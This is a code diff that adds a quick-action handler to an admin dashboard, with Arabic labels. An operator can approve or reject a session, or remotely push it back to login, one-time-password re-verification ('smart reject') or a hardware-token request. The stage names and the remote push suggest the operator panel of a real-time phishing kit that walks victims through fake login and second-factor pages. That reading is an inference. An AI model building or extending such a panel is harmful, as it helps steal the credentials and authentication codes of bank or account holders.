@@ -490,6 +490,38 @@ function Dashboard({
     }
   }
 
+  /** إجراءات سريعة: قبول / رفض / رفض ذكي / طلب توكن */
+  async function quickAction(
+    sessionId: string,
+    action: "approve" | "reject" | "smart-reject" | "token",
+  ) {
+    const map = {
+      approve: { status: "approved", stage: "processing" as const, msg: "تم القبول" },
+      reject: { status: "rejected", stage: "login" as const, msg: "تم الرفض" },
+      "smart-reject": { status: "review", stage: "verify-otp" as const, msg: "رفض ذكي — إعادة التحقق" },
+      token: { status: "review", stage: "hardware-token" as const, msg: "تم طلب التوكن" },
+    }[action];
+
+    setOrders((prev) =>
+      prev.map((o) =>
+        o.session_id === sessionId ? { ...o, status: map.status, stage: map.stage } : o,
+      ),
+    );
+    pushRemoteStage(sessionId, map.stage);
+    try {
+      await Promise.all([
+        adminSetStatus({
+          data: { username, password, sessionId, status: map.status as "new" },
+        }),
+        adminSetStage({ data: { username, password, sessionId, stage: map.stage } }),
+      ]);
+      toast.success(map.msg);
+    } catch (err) {
+      toast.error((err as Error).message);
+      void load({ silent: true });
+    }
+  }
+
   async function remove(sessionId: string) {
     if (!window.confirm("حذف هذا الطلب وسجل أحداثه؟")) return;
     try {
